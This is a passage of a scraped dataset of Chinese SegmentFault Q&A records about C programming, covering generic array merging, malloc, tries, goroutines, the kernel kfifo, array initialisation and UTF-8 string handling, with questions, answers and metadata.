      "title": "在gethostbyname_r后不管塞给它的hostent，是否会有内存泄漏问题？",
      "url": "https://segmentfault.com/q/1010000000165701"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000184799\">\n<p>一张纸没有写够……手写出来的代码不上相（各种删改），拿出<code>AStyle</code>格式化了下：</p><pre>#define XXX_MERGE_GENERIC(type, out, a, alen, b, blen) \\\n    xxx_merge(out, a, alen, b, blen, sizeof(type), XXX_LESS(type))\n\n#define XXX_LESS(type) xxx_less_##type\n\n#define XXX_DEFINE_LESS_PRIMITIVE(type) \\\n    bool xxx_less_##type(const void *x, const void *y) \\\n    { \\\n        return *(const type*)x &lt; *(const type*)y; \\\n    }\n\ntypedef bool (*xxx_less_t)(const void *x, const void *y);\n\n// NOTE: `out` must be freed after use.\nbool xxx_merge(void **out,\n               void *a, const int alen,\n               void *b, const int blen,\n               int elem_size, xxx_less_t less)\n{\n    if (a == NULL || b == NULL || out == NULL) {\n        return false;\n    }\n\n    if (alen &lt;= 0 || blen &lt;= 0) {\n        return false;\n    }\n\n    void *p = malloc((alen + blen) * elem_size);\n    if (p == NULL) {\n        return false;\n    }\n\n    *out = p;\n    int ai = 0;\n    int bi = 0;\n\n    for (int i = 0; i &lt; alen + blen; i++) {\n        if (ai &gt;= alen || less(b, a)) {\n            memcpy(p, b, elem_size);\n            b += elem_size;\n            bi += 1;\n        } else {\n            memcpy(p, a, elem_size);\n            a += elem_size;\n            ai += 1;\n        }\n\n        p += elem_size;\n    }\n\n    return true;\n}</pre><p><strong>EDIT：</strong> 一次还写不正确，归并的条件还写错了：<br/>\n原为：<br/>\n<code>if (ai &gt;= alen || less(b, a)) {</code><br/>\n应为：<br/>\n<code>if (ai &gt;= alen || (bi &lt; blen) &amp;&amp; less(b, a)) {</code></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000333680\">\n<p>从题目要求中可以看出这是一道改写MergeSort中Merge过程的题。需要改写的地方，就在于需要类比C++的的Template,使得Merge可作用于不同类型的数组。\n由此联想到在Merge中使用void *,Merge的声明如下:\nint Merge(void *a,int la,void *b,int lb,void **c,unsigned size,int (*cmp)(void *,void *));\n其中(*cmp)函数就用来比较元素大小。下面以float数组为例，给出Merge的过程。要使Merge作用于其他类型数组,更改比较函数(*cmp)即可。</p>\n<pre><code class=\"lang-c\">#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#define ElemType float//Merge应用在不同的类型时修改ElemType定义\n#define LEN(x) (int)(sizeof(x)/sizeof(x[0]))\nint Merge(void *a,int la,void *b,int lb,void **pc,unsigned size,int (*cmp)(void *,void *));\nint fnumcmp(void *a,void *b);\nint main(){\n    float a[]={1.1,3.3,5.5,7.7,9.9};\n    float b[]={2.2,4.4,6.6,8.8,10};\n    unsigned size=(unsigned)sizeof(ElemType);// 计算该类型所占字节数\n    float *c;\n    int lc=Merge((void *)a,LEN(a),(void *)b,LEN(b),(void **)&amp;c,size,(int(*)(void *,void *))(fnumcmp));\n    int i;\n    for(i=0;i&lt;lc;i++)\n        printf(\"%.3f \",c[i]);\n    return 0;\n}\nint Merge(void *a,int la,void *b,int lb,void **pc,unsigned size,int (*cmp)(void *,void *)){\n    void *c=*pc;\n    c=(void *)malloc((la+lb)*size);\n    int i,j,k;\n    for(i=0,j=0,k=0;k&lt;(la+lb);){\n        if(j&gt;=lb || (i&lt;la &amp;&amp; (*cmp)(a+i*size,b+j*size)&lt;=0)){//对于void *a,a+i只将指针移动i字节,这并不是第i个元素地址,第i个元素地址实际上是 a+i*size\n            memcpy(c+k*size,a+i*size,size);\n            i++;\n        }\n        else{\n            memcpy(c+k*size,b+j*size,size);\n            j++;\n        }\n        k++;\n    }\n    *pc=c;\n    return k;\n}\nint fnumcmp(void *a,void *b){\n    float fa=*(float *)a;\n    float fb=*(float *)b;\n    if(fa==fb)\n        return 0;\n    else\n        return (fa&gt;fb)?1:-1;\n}\n</code></pre>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000182257\">\n<p>随手写了一个</p><pre>typedef int (* __CMP__)(const void *c1, const void *c2);\n\n\n/*\n    void qsort ( void * base, size_t num, size_t size, int ( * comparator ) ( const void *, const void * ) );\n    dlen = Data Length\n*/\nvoid * combineArray(void *a1, size_t a1Len, void *a2, size_t a2Len, size_t dlen, __CMP__ cmpFunc){\n    if( a1 == (void *)NULL ||\n        a2 == (void *)NULL ||\n        a1Len&amp;a2Len == 0 )\n    {\n        return (void *)NULL;\n    }\n\n    unsigned char  * retArray = (unsigned char *)malloc(a1Len + a2Len);\n    unsigned char * p1 = (unsigned char *)a1 ;\n    unsigned char * p2 = (unsigned char *)a2 ;\n\n    for (int i = 0 ; i &lt; a1Len; i++){\n        memcpy(retArray + i, p1 + i, 1);\n    }\n\n    for (int i = 0 ; i &lt; a2Len; i++){\n        memcpy(retArray + a2Len + i, p2 + i, 1);\n    }\n\n    qsort(retArray, a1Len+a2Len, dlen, cmpFunc);\n\n    return (void *)retArray;\n}</pre>\n</div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000181685\">\n<p>题目很简单，有两个有序数组A、B，各包含m、n个数据，给你<strong>一张纸一支笔</strong>，请写出一个函数，将A、B合并成一个新的有序数组。注意，由于数组的元素类型不确定（全是int，或者全是float，也可能是某个struct），所以你写的代码应当能处理不同类型的数据（类似C++的template技术）。</p><p>注意，答案应当在<strong>不编译</strong>的情况下尽可能保证正确。你可以试着离开IDE/vim，直接在回答框里写代码。</p>\n</div>",
      "favourite": "7",
      "glance": "3.8k",
      "tags": [
        "面试题",
        "c",
        "腾讯"
      ],
      "time": "2013-03-22",
      "title": "09年腾讯实习招聘面试题//纯C",
      "url": "https://segmentfault.com/q/1010000000181685"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000185829\">\n<p>RT，这是个简单的代码处理数组插入，想在插入时判断此时数组是否将满，如果是就将数组扩大的原来的2倍。<br/>\n不明白为什么int *newspace=(int*)malloc(size*sizet);有什么错误，如果把size改成一个定值就可以运行且结果正确，难道时malloc的bug?</p><pre>#include &lt;stdlib.h&gt;//malloc\n#include &lt;string.h&gt;//memset\n#include &lt;stdio.h&gt;//printf\n#define MAXIMUM 100\nstruct SeqList{\n  int n;\n  int * array;\n  int max;\n};\n\ntypedef struct SeqList *PSeqList;\nPSeqList createSeqList(int size){\n  PSeqList ptrSeqList=(PSeqList)malloc(sizeof(struct SeqList));\n  if(ptrSeqList==NULL){\n    return NULL;\n  }\n  \n  ptrSeqList-&gt;n=0;\n  ptrSeqList-&gt;array=(int*)malloc(size*sizeof(int));\n  ptrSeqList-&gt;max=size;\n  return ptrSeqList;\n}\n\nint insertElement(int pos, int val, PSeqList pSeqList){\n  if(pSeqList==NULL)\n    return -1;\n  \n  if(pSeqList-&gt;n==pSeqList-&gt;max){\n    int size=pSeqList-&gt;n&lt;&lt;1;\n    int sizet=sizeof(int);\n    int *newspace=(int*)malloc(size*sizet);\n    memset((void*)newspace,0,size*sizeof(int));\n    int i=0;\n    while(i++&lt;pSeqList-&gt;max){\n      newspace[i]=pSeqList-&gt;array[i];\n    }\n    free(pSeqList-&gt;array);\n    pSeqList-&gt;array=newspace;\n    pSeqList-&gt;max&lt;&lt;=1;\n  }\n\n  if(pSeqList-&gt;n==0){\n    pSeqList-&gt;array[0]=val;\n    pSeqList-&gt;n++;\n    return 0;\n  }\n\n  int i;\n  for(i=pSeqList-&gt;n;i&gt;=pos;--i){\n    pSeqList-&gt;array[i+1]=pSeqList-&gt;array[i];\n  }\n  pSeqList-&gt;n++;\n  pSeqList-&gt;array[pos]=val;\n}\n\nvoid printArray(PSeqList ptrSeqList){\n  printf(\"n: %d\\n\",ptrSeqList-&gt;n);\n  printf(\"max: %d\\n\",ptrSeqList-&gt;max);\n  int i=0;\n  for(i;i&lt;ptrSeqList-&gt;n;++i){\n    printf(\"%d \",ptrSeqList-&gt;array[i]);\n  }\n}\n\nint main(int argc, char*argv[]){\n  PSeqList ptrSeqList=createSeqList(5);\n  printArray(ptrSeqList);\n  int i=0;\n  for(i=0;i&lt;10;++i){\n    insertElement(i,i,ptrSeqList);\n  }\n  printArray(ptrSeqList);\n  insertElement(5,110,ptrSeqList);\n  printArray(ptrSeqList);\n  return 0;\n}</pre>\n</div>",
      "favourite": "2",
      "glance": "1.7k",
      "tags": [
        "c"
      ],
      "time": "2013-04-06",
      "title": "诡异的malloc",
      "url": "https://segmentfault.com/q/1010000000185829"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000191928\">\n<p>如果允许对txt文件预处理的话，可以用倒排索引来实现。</p>\n<p>如果txt文件只查一次、以后再也用不到的话，那就没有。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000474108\">\n<p>按你的题目来看，似乎这些单词都是排过序的？如果是有序的话，就可以按照二分的方法来做。先读取文件总共由多少行，然后以第一个字符来查找，再按照第二个字符，以此类推，这个算法的好处是不用读取所有文件到内存中。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000192027\">\n<p>这种情况考虑下面这种数据结构：\n字典树(DictTree)</p>\n<pre><code>typedef struct _dict_tree_\n{\n    struct _dict_tree_ * dt[TREENODENUM];\n    char    c ;\n    char    flag ;\n}DT ;\n</code></pre>\n<p>具体操作就是</p>\n<p>所谓的26叉树，按照每个字母对应的子节点存储。\n然后逐行读取单词后插入到树中，比如说：\n单词：abandon\n插入树的顺序就是\na-&gt;b-&gt;a-&gt;n-&gt;d-&gt;o-&gt;n\n插入每个字母对应这个树的子节点</p>\n<pre><code>int len = strlen(str);\nwhile( i &lt; len )\n{\n    index = str[i] - 97 ;　　　　　　　　/*通过 index 来找到子节点*/\n    if( pt-&gt;dt[index] == NULL )\n    {\n        pt-&gt;dt[index] = ( DT *)malloc( sizeof( DT) );\n        pt-&gt;dt[index]-&gt;c = str[i] ;\n        pt-&gt;dt[index]-&gt;flag = EMPTY ;\n        for( j = 0 ; j &lt; TREENODENUM ; j++ )\n        {\n            pt-&gt;dt[index]-&gt;dt[j] = NULL ;\n        }\n    }\n    pt = pt-&gt;dt[index] ;\n    i++;\n}\n</code></pre>\n<p>查找就是顺着字母判断子节点是否为空</p>\n<pre><code>int len = strlen(str);\nwhile( i != len )\n{\n    index = str[i] - 97 ;\n    if( pt-&gt;dt[index] == NULL )\n        return 0 ;\n    pt = pt-&gt;dt[index] ;\n    i++;\n}\n</code></pre>\n</div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000191910\">\n<p>用C或C++实现从一个比较大的txt文件里查找一个单词，txt文件里每行一个单词，按a~z从上到下排列，有什么好的算法，用什么数据结构可以提高查询的速度和效率？？</p>\n</div>",
      "favourite": "2",
      "glance": "4.1k",
      "tags": [
        "c",
        "c++",
        "算法",
        "数据结构"
      ],
      "time": "2013-04-22",
      "title": "关于用C从txt文件查找单词的搜索算法优化问题",
      "url": "https://segmentfault.com/q/1010000000191910"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000207310\">\n<p>C多进程或多线程开发明显是史前时代了，知识结构落后啊，多看点网络编程的书，goroutine绝对秒杀c多线程。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000317845\">\n<p>给你一个其他的选择node.js,golang也是可以的</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000204591\">\n<p>用Go写游戏服务器是一个非常棒的选择，当然主要一个原因就是Go语言特有的Goroutine和Channel。</p>\n<p>看了这个问题后我不是很清楚你们是在学习多线程编程还是分布式架构。如果是多线程编程，对应Go的实现当然是Goroutine和Channel。如果是分布式架构，用HTTP编程应该最适合你，模型足够简单。HTTP编程我就不介绍了，我们之前写的《Go语言编程》中也有介绍。如果要多个HTTP服务器分摊客户端请求，前面加个Nginx作LB应该就可以了。</p>\n<p>Go语言中控制Goroutine数量有挺多灵活的办法的，一般最简单的就是预先直接创建这么多个Goroutine，然后每个Goroutine自身是一个死循环，持续从作为参数传入的Channel中读取需要处理的数据包。</p>\n<p>这里就先不展开了，看你具体的需求再论。我以前参与的游戏项目都是用C++然后是IOCP和epoll之类的处理高并发。可惜当时还没有Go可以用，否则应该会更有乐趣。</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000204555\">\n<p>老师留了一个游戏服务器作业，我想用Go来写，节省代码量，顺便用用新技术~</p>\n<p>但是老师在讲服务器要求的结构的时候用了多进程来分配客户端连接数量。我查了资料，貌似Go没有提供很明显的多进程接口，倒是有rpc包，感觉不太靠谱……我自己还是倾向于用GoRoutine搭建，便于线程间通信。我想问下，这样做靠谱么？</p>\n</div>",
      "favourite": "5",
      "glance": "4.5k",
      "tags": [
        "golang",
        "socket",
        "c",
        "服务器",
        "游戏"
      ],
      "time": "2013-05-23",
      "title": "GoRoutine可以替代C Socket的多线程来做游戏服务器么？",
      "url": "https://segmentfault.com/q/1010000000204555"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000249362\">\n<p>先上内核循环缓冲结构体的定义：</p>\n<pre><code>struct kfifo {\n        unsigned char *buffer;        /* the buffer holding the data */\n        unsigned int size;        /* the size of the allocated buffer */\n        unsigned int in;        /* data is added at offset (in % size) */\n        unsigned int out;        /* data is extracted from off. (out % size) */\n        spinlock_t *lock;        /* protects concurrent modifications */\n};\n</code></pre>\n<p>如果对“Linux内核中的循环缓冲区”不是很了解的话，可以先参考  <a href=\"http://www.kerneltravel.net/jiaoliu/kern-kfifo.html\" rel=\"nofollow\">这里</a>。内核中有关kfifo.c和kfifo.h两个文件的源码以及该问题的具体情况，可以查看<a href=\"http://bbs.chinaunix.net/thread-4088139-1-1.html\" rel=\"nofollow\">这里</a>。</p>\n<p>对于结构体内的in和out两个变量，内核是作如下处理的:1、在读入数据时增加in；2、在取出数据时增加out；3、当检测到两个相等的时候将它们复位归0。1和2不作讨论和分析，针对第3点的处理，内核代码如下：</p>\n<pre><code>static inline unsigned int kfifo_get(struct kfifo *fifo,\n                                     unsigned char *buffer, unsigned int len)\n{\n        unsigned long flags;\n        unsigned int ret;\n\n        spin_lock_irqsave(fifo-&gt;lock, flags);\n        ret = __kfifo_get(fifo, buffer, len);\n\n        /*\n         * optimization: if the FIFO is empty, set the indices to 0\n         * so we don't wrap the next time\n         */\n        if (fifo-&gt;in == fifo-&gt;out)\n                fifo-&gt;in = fifo-&gt;out = 0;\n\n        spin_unlock_irqrestore(fifo-&gt;lock, flags);\n\n        return ret;\n}\n</code></pre>\n<p>问题：当数据写入速度大于读取速度的时候，in和out的值将永远不会相等，也就是说buffer永远是有数据的，这样的话in和out都存在超出自身数值表示范围，从而导致错误？</p>\n<p>针对这个问题，不知大家有什么好的建议？</p>\n</div>",
      "favourite": "1",
      "glance": "3.5k",
      "tags": [
        "c",
        "linux-kernel",
        "linux",
        "ubuntu",
        "嵌入式"
      ],
      "time": "2013-06-29",
      "title": "内核kfifo.c中in和out的问题【已解决】",
      "url": "https://segmentfault.com/q/1010000000249362"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000253655\">\n<p>我的程序运行在Solaris系统上，程序结构如下:<br/>\n    {<br/>\n     解析配置文件，用配置文件的内容在内存构建hash tables；<br/>\n         创建多个线程访问hash tables；<br/>\n}<br/>\n这样每次修改配置文件，都要重启程序。<br/>\n目前我打算动态load,也就是当修改完配置文件，发一个信号给程序，由程序动态更新hash tables.</p>\n<p>我现在想到的方法是用exec()系列函数，大家有什么其它好的建议吗？谢谢！</p>\n</div>",
      "favourite": "1",
      "glance": "2.4k",
      "tags": [
        "c",
        "unix"
      ],
      "time": "2013-07-12",
      "title": "C程序动态load配置文件",
      "url": "https://segmentfault.com/q/1010000000253655"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000253877\">\n<p>java里面是个list</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000254762\">\n<p>protobuf repeated的数据类型和C++的Vector，list类似，只能传输相同的数据类型。\n当然，如果你为了传输多种数据类型，可以使用类似与C++union的方式，用个大消息，消息的每个字段都使用optional标记，你在业务处理的时候，每次只对一个字段赋值同样可以达到目的。<br/>\n另外： repeated只能表示数据有还是没有，在没有的时候，究竟是保留原有的数据不动，还是删除所有数据，这点有歧义。需要使用另外的字段进行处理。<br/>\n<a href=\"http://blog.csdn.net/chenxiaohong3905/article/details/6929430\" rel=\"nofollow\">http://blog.csdn.net/chenxiaohong3905/article/details/6929430</a><br/>\n<a href=\"http://blog.csdn.net/chenxiaohong3905/article/details/6906459\" rel=\"nofollow\">http://blog.csdn.net/chenxiaohong3905/article/details/6906459</a></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000253709\">\n<p>是的，<code>repeated</code> 就是说该字段是指定类型的数组。</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000253677\">\n<p>是否可以用这个字段传输很多个该类型的数据？</p>\n</div>",
      "favourite": "1",
      "glance": "11.8k",
      "tags": [
        "c",
        "c++",
        "protobuf",
        "分布式"
      ],
      "time": "2013-07-12",
      "title": "protobuf repeated 怎么用的？",
      "url": "https://segmentfault.com/q/1010000000253677"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000259107\">\n<p>局部变量的空间分配在栈上；没有初始化的时候，取决于编译器的实现，一般不应该做任何假定。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000270658\">\n<p>C/C++中除了全局变量都不会进行初始化。需要程序员自己初始化，也就是像楼主说的那样。\n这个程序故意对没有初始化的数组读取。是不规范的代码</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000270681\">\n<p>“初始化”这个术语确实有些误导。不能顾名思义。数组的所谓“初始化”并非是“给数组分配内存”，而仅仅是“归零数组”。</p>\n<p>用 <code>char *string[10]</code> 这样的语句，就<strong>已经</strong>声明了数组，并<strong>分配</strong>了储存空间。储存空间是在<strong>栈上静态分配</strong>的。这时数组是可以使用的。</p>\n<p>但由于每一个程序分配到的内存都是“二手”的，里面可能有上一个程序保存的数据，因此这时，<strong>数组中的内容是随机内容</strong>。因此，我们需要对数组进行<strong>归零</strong>。这就叫<strong>数组的初始化</strong>。</p>\n<hr/>\n<p>对于数组的归零，有三种方式。考虑 <code>int a[10]</code> 这个数组：</p>\n<ol>\n<li><p>手工用 <code>a[0] = 0; a[1] = 0; a[2] = 0</code>…… 这样的语句</p>\n<p>这种做法是非常可笑的，效率低，容易出错，不应该使用。</p></li>\n<li><p>使用循环 <code>for (i = 0; i &lt; 10; i++) a[i] = 0;</code> </p>\n<p>这种做法本质上是和方法 1 相同的。效率很低，容易出错。<em>不过 <code>gcc</code> 等高级编译器可以优化成 <code>memset()</code>，因此一定要使用一款好的编译器。微软的编译器就不多说了。</em></p></li>\n<li><p><code>memset(a, 0, 10)</code></p>\n<p>不错的方法，这种方法使用的很广泛。但由于不是声明时就初始化，比较繁琐。</p></li>\n<li><p><code>int a[10] = {0};</code></p>\n<p><strong>好方法</strong>。这在声明时就给数组指定了全部是 <code>0</code> 的内容。</p>\n<p>有人要问了，哪里有这样的？难道不是：<code>int a[10] = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0};</code> 吗？实际上，只写一个 <code>0</code> 是一种简便写法，所有元素都会被设置成 <code>0</code>，一目了然。</p></li>\n</ol>\n<hr/>\n<p>不同的编译器，或同款编译器在不同的编译选项下，可能会把数组自动清零。这种情况下，容易遗忘初始化数组。要小心 Debug 模式没问题，Release 模式有问题的陷阱。</p>\n<p>不过，如果你能保证，你访问的数组内容之前，已经向数组保存了有意义的数据，比如在使用 <code>a[0]</code> 之前已经 <code>a[0] = 2</code> 了，那么是没有任何问题的。</p>\n<p>通常来说，没事就给所有的元素都初始化一下是完全没必要的。比如：</p>\n<pre><code>char str[10] = {'\\0'};\nscanf(\"%s\", &amp;s);\n</code></pre>\n<p>是完全没必要的。<code>char str[10] = {'\\0'};</code> 完全可以改成 <code>char str[10];</code></p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000259102\">\n<p>今天看了一个代码：</p>\n<pre><code>int main(){\n　 char buff[10];\n   printf(\"%d\\n\", buff[2]);   // 输出一些随机的数字或字符\n   return(0);\n}\n</code></pre>\n<p>我也很久没接触C了，和我印象中C数组的声明有些不一样。我记得数组需要一些初始化的，类似 <code>char buff[10] = {0};</code> 或者 <code>static char buff[10];</code>。为何上面的数组不需要初始化？？还是我本来就记错了？？</p>\n<p>是不是当<code>char buff[10]</code>的时候，已经在内存中的<strong>什么</strong>地方为这个数组分配了空间？？当我用gdb调试的时候，print buff,会输出<code>_\\000%\\000\\000\\000\\000?\\177</code>。</p>\n<p>谢谢解疑。</p>\n</div>",
      "favourite": "0",
      "glance": "5.4k",
      "tags": [
        "c",
        "c++"
      ],
      "time": "2013-07-29",
      "title": "C 数组的初始化问题 ？",
      "url": "https://segmentfault.com/q/1010000000259102"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000266309\">\n<p>在看侯捷的&lt;深度探索c++对象模型&gt;时有一段提到c语言中的一个技巧,就是把单一元素的数组放在一个struct的尾端,于是每个struct objects可以拥有可变大小的数组:</p>\n<pre><code>struct mumble{\n    /*stuff */\n    char pc[1];\n}\n//从档案或标准输入中取得一个字符串,然后为struct本身和该字符串配置足够的内存\nstruct mumber *pmumb1 =(struct mumble*)malloc(sizeof(struct mumble)+strlen(string)+1;\n</code></pre>\n<p>strcpy(pmumbl1-&gt;pc, string);</p>\n<p>我在网上看了几篇文章,这中用法貌似在socket中需要发送不定长的包时常用.他们主要和下面这种方法比较:</p>\n<pre><code>struct mumble{\n    /*stuff*/\n    char* pc;\n}\n</code></pre>\n<p>把pc定义为指针后就需要动态分配数组,这样数组空间和mumble就不是连续的了.\n貌似还有其他的好处,不列举了.\n我比较疑惑的有两点:</p>\n<ol>\n<li>一般都把pc声明为长度为0的数组<strong>char pc[0]</strong>,侯捷的书里把它声明为长度为1的数组<strong>char pc[1]</strong>,这两者有什么区别吗?\n既然0,1都可以,我就试着声明为其他长度比如2,3,发现也没问题.和声明为0,1相比,差别仅仅在于节省了空间吗?</li>\n<li>为mumble申请了一大块内存后,pc就指向了一块内存,但是声明时它是0长度或是长度为1的,访问pc[2],pc[3]时为什么没有越界?</li>\n</ol>\n<p>多谢了</p>\n</div>",
      "favourite": "1",
      "glance": "3.1k",
      "tags": [
        "c"
      ],
      "time": "2013-08-19",
      "title": "不定长结构体的疑问",
      "url": "https://segmentfault.com/q/1010000000266309"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000266484\">\n<p>当输入不满足第一个if语句的条件时，不是理想的重新给type1和type2赋值而是死循环。</p>\n<pre><code>#import &lt;Foundation/Foundation.h&gt;\nint main(int argc, const char * argv[])\n{\n    @autoreleasepool {\n        //6.5.1\n        long int type1, type2, flag=0;\n        printf(\"请输入要测试的两个整数：\");\n        while (flag==0) {\n            scanf(\"%li %li\", &amp;type1, &amp;type2);\n            if( (type1 ==(long int) type1) &amp;&amp; (type2 ==(long int) type2) &amp;&amp; type2 != 0){\n\n                if( type1 % type2 == 0 ){\n                    printf(\"%li可以被%li整除\", type1, type2);\n                    flag=1;\n                }else{\n                    printf(\"%li不可以被%li整除\", type1, type2);\n                    flag=1;\n                }\n\n            }else{\n                printf(\"只能输入整数，并且第二个数不能为0，请重新输入:\");\n            }\n        }\n        return 0;\n    }\n}\n</code></pre>\n</div>",
      "favourite": "0",
      "glance": "2k",
      "tags": [
        "objective-c",
        "c"
      ],
      "time": "2013-08-19",
      "title": "请大家帮我看看为什么这段代码一直是死循环（obejective-c）",
      "url": "https://segmentfault.com/q/1010000000266484"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000438307\">\n<p>建议按照 此 大神的的建议路线学习，请戳 <a href=\"http://coolshell.cn/articles/4102.html\" rel=\"nofollow\">http://coolshell.cn/articles/4102.html</a></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000314882\">\n<p>入门的话，看《C Primer Plus》吧，不二的选择。进阶，看你走的是什么路线了，这个我没有办法给太多的建议。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000314922\">\n<p>我学习C过程中看过的一些比较好的书和资料（按照阅读顺序排列）：</p>\n<ol>\n<li>《The C programming language》</li>\n<li>《UNIX环境高级编程》</li>\n<li>《UNIX网络编程》 &amp; netcat命令源码</li>\n<li>Redis源码</li>\n</ol>\n</div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000314873\">\n<p>我个人觉得涉及到业务逻辑的实现不应该用C去做；C适合做基础底层，但是底层没有良好的操作系统基础又很难学习下去。 C学习门槛挺高的。</p>\n<p>问问大牛们，怎么学好C呢，应该做哪些方面的开发来提高C语言功底呢？</p>\n</div>",
      "favourite": "10",
      "glance": "3.3k",
      "tags": [
        "c",
        "学习方法"
      ],
      "time": "2013-10-01",
      "title": "如何学习和深入C语言编程？",
      "url": "https://segmentfault.com/q/1010000000314873"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000317317\">\n<p>加入文件是utf-8编码，内容如下：</p>\n<blockquote>\n<p>我是来自上海的互联网程序员，主要从事Web/游戏/手机服务器开发.</p>\n</blockquote>\n<p>下面C代码可以一个一个的读入这些中文字符():</p>\n<pre><code>#define UTF8_CHAR_LEN( byte ) ((( 0xE5000000 &gt;&gt; (( byte &gt;&gt; 3 ) &amp; 0x1e )) &amp; 3 ) + 1)\nchar content[255]; //一行一行的读入文件，255的话大概满足需求了；这个代码片段也只是测试用.\nFILE *data_file = fopen(\"path/to/file\", \"r\");\nif (!data_file) {\n    fprintf(stderr, \"error happened when read file: %s\",\"path/to/file\");\n    return -1;\n}\nfgets(content, 255, data_file);\nint i;\nfor (i = 0; content[i] != '\\0'; i++) {\n    int utf8_char_len = UTF8_CHAR_LEN(content[i]);\n    if (utf8_char_len &gt; 1) {\n        char word[4]; // utf-8占位最大字节也就是4个字节\n        memcpy(word, (content + i), utf8_char_len); \n        i += utf8_char_len - 1;\n        printf(\"%s\\t\", word);\n    }\n    else {\n        printf(\"%c\\t\", content[i]);\n    }\n}\nfclose(data_file);\n</code></pre>\n<p>输入：</p>\n<p>我   是   来   自   上   海   的   互   联   网   程   序   员   ，   主   要   从事  W   e   b   /   游   戏   /   手   机   服   务   器   开   发   .   </p>\n<p>这里我觉得主要问题是字符指针它不标识出编码字符的大小，如果单纯的用 (p + 1)的话会把编码混乱掉，所以要先判断字符编码的所占字节数，然后再 (p + size<em>of</em>word) 输出;</p>\n<p>上面的代码满足我现在的需求，不过还有一些疑问；</p>\n<p>utf-8编码的字符在Linux c 下面怎么处理的呢？一般模式我还在寻找，有机会帖在这里. </p>\n<p>这里还帖一个用宽字符库遍历utf-8字符串的代码片段:</p>\n<pre><code>wchar_t wstr[] = L\"你好\";\n    // en_US.UTF-8 是我本地的locale\nsetlocale(LC_ALL, \"en_US.UTF-8\");\nint i;\nfor (i = 9; i &lt; wcslen(wstr); i++) {\n    wprintf(L\"%lc\\n\", wstr[i]);\n}\n</code></pre>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000320367\">\n<p>你第一段代码应该是有两个问题，</p>\n<p>1、step的自增有问题，不应该在每次for里面都++，而是根据字符宽度再加</p>\n<p>2、printf打印是遇0结束，你的word最后一个字符根本不是0，所以就出现每个中文后面多出来的乱码，这个是很基础的问题。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000316895\">\n<p>使用 glib 的 utf8 相关函数，或者转成 wchar。或者拿 iconv 把编码转成 utf32 然后用 uint32_t 表示字符也成。</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000316867\">\n<p>我的需求是从utf-8文件读入到内存，然后想遍历它来寻找某个特殊字符。</p>\n<p>我的代码片段:</p>\n<pre><code>// 检查utf-8字符所占字节数\n#define UTF8_CHAR_LEN( byte ) ((( 0xE5000000 &gt;&gt; (( byte &gt;&gt; 3 ) &amp; 0x1e )) &amp; 3 ) + 1)\nFILE *fp = fopen(PATH_TO_FILE, \"r\");\n\nchar *buf = malloc(LENGTH_OF_FILE * sizeof(char));\n\nfgets(buf, LENGTH_OF_FILE, fp);\n\nint step = 0;\nfor (; *(buf + step) != '\\0'; ++step) {\n  int utf8_word_len = UTF8_CHAR_LEN(buf + step);\n  // utf8是多字节的，我也确定了编码是utf-8 所以不需要判断是否是其他的编码了\n  if (utf8_word_len &gt; 1) {\n    char word[utf8_word_len];\n    strncpy(word, (buf+step), urf8_word_len);\n    step += urf8_word_len;\n    // 这里就可以输出中文了，但是很奇怪啊，输出中文字符后还有一个很奇怪的字符\n    // 肯定是我哪里搞错了，还请高手指点.\n    printf(\"%s\\n\", word);\n  }\n  else {\n    printf(\"%c\\n\", buf + step);\n  }\n}\nfclose(fp);\nfree(buf);\n</code></pre>\n<p>问题是，当文件遇到utf-8编码的中文，这段代码就输出乱码了。我知道%c 是输出一个字节的内容，utf-8里面中文可能需要3个字节，所以有乱码会；但是自己不知道怎么处理 